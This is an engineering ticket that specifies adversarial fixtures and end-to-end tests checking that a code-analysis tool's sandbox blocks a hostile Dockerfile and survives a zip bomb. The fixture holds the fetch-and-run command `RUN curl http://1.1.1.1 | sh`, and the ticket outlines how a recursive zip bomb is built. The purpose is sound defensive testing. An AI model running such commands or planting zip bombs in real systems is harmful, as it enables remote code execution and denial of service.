# Story S6-03 — Hostile-Dockerfile + zip-bomb adversarial fixtures + CLI-level pins

**Step:** Step 6 — Ship Layer C dynamic probes: `SyftSBOMProbe`, `GrypeCVEProbe`
**Status:** Ready
**Effort:** M
**Depends on:** S6-01 (`SyftSBOMProbe` implementation; the probe-level hostile-Dockerfile unit test is the probe-PR gate, and this story is the **system-level** gate that exercises the same defense end-to-end through the CLI)
**ADRs honored:** ADR-0003 (sandbox `network="none"` for build steps; build failure is the expected outcome for hostile Dockerfiles; `tests/adv/test_no_unscoped_network_egress.py` is CI-gating), ADR-0005 (`docker` + `syft` are ADR-gated; the host-daemon-coupling open question is owned at the probe level; this story exercises the closure end-to-end)

## Context

S6-01 ships the **probe-level** hostile-Dockerfile pin: a unit test monkeypatches `tools.docker.build` to raise `ToolNonZeroExit` and asserts `SyftSBOMProbe` emits `build_status: failed, network_egress_attempted: true, confidence: low`. That's the probe-PR-merge gate. This story ships the **system-level** pin: two adversarial fixtures + two end-to-end tests run through the CLI binary, asserting (a) the sandboxed `docker build` actually fails inside `--network=none`, (b) **no remote-fetched bytes appear anywhere in `repo-context.yaml` or `.codegenie/`**, (c) the slice records the failure honestly and the gather completes exit-0, and (d) the syft zip-bomb path is cgroup-killed without crashing the gather.

Both fixtures gate Step 6 as **load-bearing** per Goals #4 ("Phase 2 is the first phase that executes foreign code on hostile input at scale"). The whole point of the subprocess sandbox extension (ADR-0003) and the six-binary `ALLOWED_BINARIES` addition (ADR-0005) is that *hostile* repos must produce honest evidence and not infect the gather artifacts. If `RUN curl http://1.1.1.1 | sh` succeeds — even partially, even just writing a temp file the gather later reads — the entire Phase 2 threat model fails. Likewise, if a 10 KB Dockerfile that `COPY`s a zip-bomb causes syft to crash the gather rather than emitting `confidence: low`, the failure-mode contract (`final-design.md §"Edge cases"` row 9 + `tests/adv/test_syft_zipbomb.py`) breaks.

The fixtures live under `tests/fixtures/hostile_dockerfile_curl/` (shared with S6-01's probe-level test — S6-01 reads the same `Dockerfile`) and `tests/fixtures/syft_zipbomb_dockerfile/`. Sharing the curl-pipe fixture is intentional: one canonical hostile-Dockerfile artifact, two test layers (probe-level + system-level). The tests live under `tests/adv/` and are CI-gating.

On macOS, `bwrap` is unavailable and `sandbox-exec`'s `--network=none` is best-effort (`final-design.md §"Conflict-resolution table" D2` + ADR-0003 consequences). The tests must run on Linux CI as the authoritative gate; macOS runs accept the documented limitation and either (a) skip with a clear `pytest.skip` reason, or (b) assert the macOS fallback path (`sandbox.docker_build_daemon_coupling` warning) — whichever the implementer chooses, the skip-reason / fallback-path must be explicit, not silent.

## References — where to look

- **Architecture:**
  - `../phase-arch-design.md §"Edge cases"` row 9 — `RUN curl http://1.1.1.1 | sh`; sandbox network=none; build fails; SBOM records `network_egress_attempted: true`.
  - `../phase-arch-design.md §"Testing strategy" → "Adversarial tests (`tests/adv/`) — CI-gating"` items 6 + 7:
    - `test_hostile_dockerfile_curl.py` — `RUN curl http://1.1.1.1 | sh`; sandbox network=none; build fails; SBOM records `network_egress_attempted: true`.
    - `test_syft_zipbomb.py` — Dockerfile COPYs zip bomb; syft OOM-killed by cgroup; probe `confidence: low`.
  - `../phase-arch-design.md §"Component design" #8 SyftSBOMProbe` — failure behavior (build failure → `build_status: failed`, sandbox network leak → `network_egress_attempted: true (observable; CI canary)`).
- **Phase ADRs:**
  - `../ADRs/0003-subprocess-sandbox-profile-extension.md §"Consequences"` — `tests/adv/test_hostile_dockerfile_curl.py` named explicitly as a CI-gating test; macOS sandbox-exec best-effort caveat.
  - `../ADRs/0005-allowed-binaries-additions.md §"docker"` + §"syft"` — the threat surfaces this story closes.
- **Production ADRs:**
  - `../../../production/adrs/0005-no-llm-in-gather-pipeline.md` — failed-build evidence is a fact the Planner consumes, not a bug.
- **Source design:**
  - `../final-design.md §"Failure modes & recovery"` — `docker build network=none ⇒ curl fails inside sandbox` row.
  - `../final-design.md §"Components" §4.2 SyftSBOMProbe` — `[S — without the local registry mirror]` provenance; hostile Dockerfile case is *honest evidence*, not exception handling.
- **Existing code (post S6-01):**
  - `src/codegenie/probes/syft_sbom.py` — the probe under test.
  - `src/codegenie/tools/docker.py` — `tools.docker.build` wrapper; raises `ToolNonZeroExit` when the build phase fails under `--network=none`.
  - `src/codegenie/exec.py` — `run_in_sandbox` with `network="none"` default + cgroup memory limits.
  - `src/codegenie/cli.py` — `codegenie gather` entry point; the end-to-end harness invokes this.
  - `tests/fixtures/hostile_dockerfile_curl/` (shared with S6-01) — `Dockerfile` containing `FROM alpine\nRUN curl http://1.1.1.1 | sh`.

## Goal

Ship two CI-gating adversarial fixtures + two end-to-end CLI tests that close the Phase-2 threat model for hostile Dockerfiles and zip-bomb SBOM payloads: (i) a `RUN curl ... | sh` Dockerfile that fails inside the sandbox produces `build_status: failed, network_egress_attempted: true, confidence: low` with **no remote-fetched bytes in `.codegenie/`**; (ii) a Dockerfile that `COPY`s a zip bomb causes syft to be cgroup-killed, the probe emits `confidence: low`, and the gather completes exit-0 without an unhandled exception.

## Acceptance criteria

- [ ] `tests/fixtures/hostile_dockerfile_curl/Dockerfile` exists; contents `FROM alpine:3.19\nRUN curl http://1.1.1.1 | sh\n` (or equivalent — `127.0.0.1` is acceptable; `1.1.1.1` matches the architecture spec); ≤ 200 bytes; no other files in the fixture so the build context is minimal.
- [ ] `tests/fixtures/syft_zipbomb_dockerfile/Dockerfile` exists; structure `FROM alpine:3.19\nCOPY bomb.zip /tmp/bomb.zip\n`; `tests/fixtures/syft_zipbomb_dockerfile/bomb.zip` is a real zip-bomb (recursive zip; on-disk ≤ 50 KB; decompressed > 1 GB nominally); generated by a `scripts/regen_zipbomb_fixture.py` helper this story ships so the fixture's provenance is reproducible.
- [ ] `tests/adv/test_hostile_dockerfile_curl.py` exists; runs `codegenie gather` end-to-end against `tests/fixtures/hostile_dockerfile_curl/`; asserts:
  - [ ] Process exit code is `0` (per ADR-0003: gather completes; `--strict` is the CI hammer, default is exit-0 with honest evidence).
  - [ ] `repo-context.yaml` parses and validates against the envelope schema.
  - [ ] `repo-context.yaml#probes.syft_sbom` has `build_status == "failed"`, `network_egress_attempted is True`, `packages == []`, `confidence == "low"`, `warnings` contains `"sandbox.docker_build_network_blocked"`.
  - [ ] **No remote-fetched bytes appear anywhere under `.codegenie/`** — verified by an explicit byte-scan: walk every file under `.codegenie/`, assert none contains the substring `"1.1.1.1"` outside the parsed Dockerfile slice's structured `run_commands` field (where the Dockerfile text is faithfully recorded as evidence), and assert no file's content matches any byte-pattern characteristic of a curl-fetched payload (e.g., a planted canary string `CURL_FETCHED_CANARY_BYTES` the test setup would have to write — assert the canary string is absent from every file under `.codegenie/`).
  - [ ] The Dockerfile probe's `run_commands` field **does** contain the `curl` line (`DockerfileProbe` faithfully records the Dockerfile contents as evidence; that is not a leak — the leak is the *resolved* bytes the `curl` would have fetched).
- [ ] `tests/adv/test_syft_zipbomb.py` exists; runs `codegenie gather` end-to-end against `tests/fixtures/syft_zipbomb_dockerfile/`; asserts:
  - [ ] Process exit code is `0`.
  - [ ] `repo-context.yaml#probes.syft_sbom.confidence == "low"`.
  - [ ] `warnings` contains either `"syft.oom_killed"` or `"sandbox.cgroup_memory_limit_exceeded"` (the wrapper picks one; the test accepts either — what matters is that the failure is structurally surfaced, not silent).
  - [ ] The gather wall-clock is **bounded** — the test runs with `pytest.timeout(120)` or equivalent; if syft is not cgroup-killed and the test times out, that is a regression of the cgroup memory limit in `run_in_sandbox` (ADR-0003 consequence) and the test fails for the right reason.
  - [ ] No unhandled exception in the gather process (no traceback in stderr).
- [ ] macOS handling is explicit: each test sets a clear `pytest.skip("requires bwrap; macOS sandbox-exec does not constrain docker build daemon-coupling — see ADR-0005")` on macOS **or** asserts the fallback warning path (`"sandbox.docker_build_daemon_coupling"`) — implementer's choice; the skip/fallback must reference ADR-0005 in its message.
- [ ] `scripts/regen_zipbomb_fixture.py` exists; documented header explains provenance + how to regenerate; outputs a deterministic byte sequence (same SHA-256 across runs given the same parameters); CI does **not** invoke this script — it runs once locally when the fixture lands and the resulting `bomb.zip` is committed.
- [ ] `tests/adv/conftest.py` (extend if exists) provides a `gather_run(fixture_dir: Path) → GatherResult` helper that returns `(exit_code, stdout, stderr, repo_context_yaml_path)` — shared by both tests in this story and by Step 8's `tests/integration/` suite.
- [ ] Both tests are marked CI-gating (no `@pytest.mark.skip`, no `@pytest.mark.xfail`); they appear in the `.github/workflows/`'s `test` job in the `tests/adv/` selection (wiring confirmed by S8-06; this story owns the tests, S8-06 owns the workflow wiring).
- [ ] Definition-of-done: `ruff check` + `ruff format --check` on the test files pass; `pytest tests/adv/test_hostile_dockerfile_curl.py tests/adv/test_syft_zipbomb.py -q` passes on Linux CI; on macOS local, the tests either skip or pass via the fallback branch.

## Implementation outline

1. **Ship the curl-pipe-sh fixture.** Author `tests/fixtures/hostile_dockerfile_curl/Dockerfile` exactly as specified. No `.dockerignore`, no other files. Add a `README.md` paragraph documenting: "This fixture exists as evidence — the build is expected to fail inside `--network=none`. See ADR-0003 and `tests/adv/test_hostile_dockerfile_curl.py`."
2. **Ship the zip-bomb fixture + generator.**
   - Author `scripts/regen_zipbomb_fixture.py` — pure-Python; uses the `zipfile` module to build a recursive-zip whose nominal decompressed size exceeds the cgroup memory limit (`exec.py`'s memory limit per ADR-0003) by a factor of ≥ 10. Document the exact construction (e.g., 10-level recursive zip of a 100 MB zero-pad). The script is **deterministic** — same arguments produce a byte-identical `bomb.zip` so CI never regenerates and the committed fixture's BLAKE3 is the canonical reference.
   - Run the script once locally; commit the resulting `tests/fixtures/syft_zipbomb_dockerfile/bomb.zip` (≤ 50 KB on disk).
   - Author `tests/fixtures/syft_zipbomb_dockerfile/Dockerfile` (`FROM alpine:3.19\nCOPY bomb.zip /tmp/bomb.zip\n`) and a sibling `README.md`.
3. **Author the shared `gather_run` harness** in `tests/adv/conftest.py` (or extend the existing one). Signature: `def gather_run(fixture_dir: Path, *, strict: bool = False, timeout_s: int = 120) → GatherResult`. The helper invokes `codegenie gather <fixture_dir>` via `subprocess.run` with `cwd=fixture_dir`, `capture_output=True`, and the requested timeout. Returns a NamedTuple with the four fields above.
4. **Author `tests/adv/test_hostile_dockerfile_curl.py`.**
   - Plant a canary string in the test setup that *would* be embedded in any fetched payload if curl actually ran (e.g., set up a local stub server that, if reached, would write `CURL_FETCHED_CANARY_BYTES` somewhere; *not* needed if the sandbox denies network connection — but plant the canary in a discoverable place anyway, then assert it's *absent* from `.codegenie/` after the run). The architecture spec explicitly says "no remote-fetched bytes appear in `repo-context.yaml`" — the canary scan is the operational definition of that claim.
   - Run `gather_run(...)`; assert exit 0; parse `repo-context.yaml`; assert the four `syft_sbom` slice fields above; walk `.codegenie/` and assert the canary string is absent everywhere.
   - Cross-check: assert `repo-context.yaml#probes.dockerfile.run_commands` does contain a record of the `curl` line — DockerfileProbe records evidence; not recording it would be the wrong fix.
5. **Author `tests/adv/test_syft_zipbomb.py`.**
   - `gather_run(..., timeout_s=120)`; assert exit 0 within timeout; assert `syft_sbom.confidence == "low"`; assert `warnings` contains one of `{"syft.oom_killed", "sandbox.cgroup_memory_limit_exceeded"}`; assert stderr has no Python traceback.
6. **Wire macOS handling.** At module-top in each test file:
   ```python
   pytestmark = pytest.mark.skipif(
       sys.platform == "darwin",
       reason="macOS sandbox-exec does not constrain docker build daemon-coupling; "
              "see ADR-0005 §docker. Linux CI is the authoritative gate.",
   )
   ```
   Or — alternative branch — assert the `sandbox.docker_build_daemon_coupling` warning path on macOS; both are acceptable per Acceptance §6.

## TDD plan — red / green / refactor

### Red

Path: `tests/adv/test_hostile_dockerfile_curl.py`

```python
"""Pins:
- Hostile `RUN curl http://1.1.1.1 | sh` fails inside sandbox network=none.
- Gather still exits 0 with honest evidence; --strict is the CI hammer.
- No remote-fetched bytes anywhere in .codegenie/ — canary scan.
- DockerfileProbe records the curl line as evidence (that is not a leak).
Traces to: phase-arch-design.md §Edge cases row 9 + §Adversarial tests #6;
ADR-0003 (sandbox network=none); ADR-0005 (docker subsection)."""
import json
import sys
from pathlib import Path
import pytest
import yaml

FIXTURE = Path("tests/fixtures/hostile_dockerfile_curl")
CURL_FETCHED_CANARY_BYTES = "CURL_FETCHED_CANARY_BYTES_SENTINEL"  # never appears in source bytes

pytestmark = pytest.mark.skipif(
    sys.platform == "darwin",
    reason="See ADR-0005 §docker; Linux CI is the authoritative gate.",
)

def test_hostile_run_curl_pipe_sh_end_to_end(tmp_path, gather_run):
    # ARRANGE: copy fixture to tmp_path so .codegenie/ writes are isolated
    ...
    # ACT
    result = gather_run(tmp_path)
    # ASSERT: exit + slice
    assert result.exit_code == 0
    ctx = yaml.safe_load(result.repo_context_yaml_path.read_text())
    syft = ctx["probes"]["syft_sbom"]
    assert syft["build_status"] == "failed"
    assert syft["network_egress_attempted"] is True
    assert syft["packages"] == []
    assert ctx["probes"]["syft_sbom"]["confidence"] == "low"
    assert "sandbox.docker_build_network_blocked" in syft["warnings"]
    # ASSERT: canary scan over all of .codegenie/
    cg = tmp_path / ".codegenie"
    for f in cg.rglob("*"):
        if f.is_file():
            assert CURL_FETCHED_CANARY_BYTES not in f.read_bytes().decode("latin-1", errors="ignore"), \
                f"Canary bytes leaked into {f}"
    # ASSERT: DockerfileProbe records the curl line as evidence
    dockerfile_slice = ctx["probes"]["dockerfile"]
    assert any("curl" in cmd for cmd in dockerfile_slice["run_commands"])
```

Path: `tests/adv/test_syft_zipbomb.py`

```python
"""Pins:
- Zip-bomb COPY → syft cgroup-killed; gather still exits 0; confidence=low.
- Wall-clock bounded by pytest timeout; if syft isn't killed in time, regression.
- No unhandled Python traceback in gather stderr.
Traces to: phase-arch-design.md §Adversarial tests #7; ADR-0003 (cgroup memory limit)."""
import sys
from pathlib import Path
import pytest
import yaml

FIXTURE = Path("tests/fixtures/syft_zipbomb_dockerfile")

pytestmark = pytest.mark.skipif(
    sys.platform == "darwin",
    reason="See ADR-0005 §docker; Linux CI is the authoritative gate.",
)

@pytest.mark.timeout(120)
def test_syft_zipbomb_cgroup_killed(tmp_path, gather_run):
    ...
    result = gather_run(tmp_path, timeout_s=120)
    assert result.exit_code == 0
    ctx = yaml.safe_load(result.repo_context_yaml_path.read_text())
    assert ctx["probes"]["syft_sbom"]["confidence"] == "low"
    warnings = set(ctx["probes"]["syft_sbom"]["warnings"])
    assert warnings & {"syft.oom_killed", "sandbox.cgroup_memory_limit_exceeded"}
    assert "Traceback" not in result.stderr
```

Run `pytest tests/adv/test_hostile_dockerfile_curl.py tests/adv/test_syft_zipbomb.py -q`. Both fail — fixtures and harness don't exist yet.

### Green

Implement per the **Implementation outline**: fixtures → generator script → harness → tests. Iterate on Linux CI until green. Use a local Docker daemon + bwrap for the dev loop. On macOS, the skip path is the documented contract.

### Refactor

- Extract a `_walk_codegenie_for_canary(root: Path, canary: str)` helper into `tests/adv/conftest.py` — both this story's test and S8-01's residual adversarial corpus can reuse it.
- Confirm `scripts/regen_zipbomb_fixture.py` produces a byte-identical `bomb.zip` on two consecutive runs (the same provenance test that S8-04 applies to goldens).
- Confirm both test files have no `@pytest.mark.skip` / `@pytest.mark.xfail` markers beyond the documented macOS-skip.
- `ruff check` + `ruff format` on the test files.

## Files to touch

| Path | Why |
|---|---|
| `tests/fixtures/hostile_dockerfile_curl/Dockerfile` | New — single-line `RUN curl http://1.1.1.1 \| sh` fixture (shared with S6-01's probe-level test). |
| `tests/fixtures/hostile_dockerfile_curl/README.md` | New — documents fixture's evidence-not-bug nature. |
| `tests/fixtures/syft_zipbomb_dockerfile/Dockerfile` | New — `COPY bomb.zip /tmp/bomb.zip`. |
| `tests/fixtures/syft_zipbomb_dockerfile/bomb.zip` | New — committed binary; generated by `scripts/regen_zipbomb_fixture.py`. |
| `tests/fixtures/syft_zipbomb_dockerfile/README.md` | New — documents bomb.zip's construction + regeneration command. |
| `scripts/regen_zipbomb_fixture.py` | New — deterministic zip-bomb generator; documented header. |
| `tests/adv/conftest.py` | Edit (or new) — `gather_run` helper + `_walk_codegenie_for_canary` helper. |
| `tests/adv/test_hostile_dockerfile_curl.py` | New — system-level hostile-Dockerfile test (CI-gating). |
| `tests/adv/test_syft_zipbomb.py` | New — system-level zip-bomb test (CI-gating). |

## Out of scope

- **Probe-level hostile-Dockerfile unit test** — that's S6-01's deliverable. This story is the CLI-level pin against the same defense.
- **`tests/adv/test_no_unscoped_network_egress.py`** — owned by S1-06 / Step 1 root adversarial sweep; this story's tests are *one of* its consumers but do not implement it.
- **`grype db update` scoped-egress adversarial test** — S6-04's deliverable (`tests/adv/test_grype_db_update_blocked.py`). Disjoint threat surface; disjoint test.
- **macOS sandbox-exec hardening to fully constrain `docker build`** — refused at the architecture level (ADR-0003); Linux CI is the authoritative gate. Future Phase 14 work may revisit; not Phase 2.
- **Audit-chain integration assertions** — that the audit chain advances after a hostile-Dockerfile run is checked by S5-02 / Step 5 (`tests/adv/test_audit_chain_break_observability.py`). This story's tests do not duplicate that.
- **Coverage gate enforcement** — wired by S8-06.

## Notes for the implementer

- **The canary-scan is the operational definition of "no remote-fetched bytes appear in `.codegenie/`".** Without an explicit byte-scan, the assertion is theoretical. Pick a canary string that cannot appear in source code or in pure structural Dockerfile parsing output (e.g., a UUID-shaped sentinel), plant it in a *server* that the curl command *would* fetch from if the sandbox failed, and assert the canary is **absent** from every file the gather wrote. If the canary appears anywhere, that's a sandbox bypass — the test should fail loud.
- **`1.1.1.1` is in the architecture spec as the destination IP.** It's Cloudflare DNS — a real public IP that responds to TCP/80. Use it. If your dev environment has a captive portal that responds to `1.1.1.1:80`, switch to `127.0.0.1:9999` (a port nothing listens on) and document the choice in the fixture README. The threat model isn't "what IP does curl reach"; it's "does curl reach *any* IP from inside the sandbox". Both choices answer that.
- **Exit code 0 is correct.** A Phase-2 gather against a hostile Dockerfile is not a Phase-2 bug; it's exactly the case the Planner needs to know about. The CLI exits 0 with `confidence: low` in the slice; `--strict` is the CI flag that converts low confidence into exit 3 (per ADR-0003 consequences). This test runs without `--strict`, so 0 is the expected exit.
- **Zip-bomb construction is deterministic but adversarial.** The bomb's purpose is to *exceed the cgroup memory limit* `run_in_sandbox` imposes. If the cgroup limit isn't enforced (regression in `exec.py` ADR-0003 consequence), syft runs out of host memory and the gather hangs — the `pytest.timeout(120)` catches this. **Do not** push the bomb's decompressed-size envelope larger than 10× the cgroup limit; that increases flake risk on resource-constrained CI runners without strengthening the assertion.
- **macOS skip is acceptable; macOS false-pass is not.** If you choose the skip branch, the `reason=` must reference ADR-0005 — that's how a future engineer who removes the skip discovers what they're un-skipping. If you choose the fallback-branch path (assert the `docker_build_daemon_coupling` warning), make sure the warning is actually emitted by S6-01's probe; otherwise the test asserts nothing.
- **Run both tests as part of the Step-6 PR.** Step-8 (S8-06) wires the workflows; this story's PR runs the tests locally + via Linux CI to confirm the green state before the workflow gate. Reviewers should see the green CI run in the PR description.
- **Shared `gather_run` helper.** The `tests/adv/conftest.py` `gather_run` fixture is reused across this story and Step 8's `tests/integration/test_phase2_end_to_end_node.py`. Keep its signature stable; if you find yourself adding a kwarg, surface the change in the PR body so S8 reviewers know.
- **The DockerfileProbe `run_commands` assertion is intentional.** A reviewer might think "the gather records the hostile curl line — that's the leak!" It is *not* — that's the **evidence**. The Planner reading `dockerfile.run_commands` contains `curl http://1.1.1.1 | sh` is what enables Phase 3+ to route the repo to a sandbox-hardening recipe. The leak the test guards against is *resolved* bytes (what curl would have fetched), not *recorded* bytes (the Dockerfile contents). Make sure your canary-scan distinguishes the two — the canary is in the fetched-payload, not in the Dockerfile.
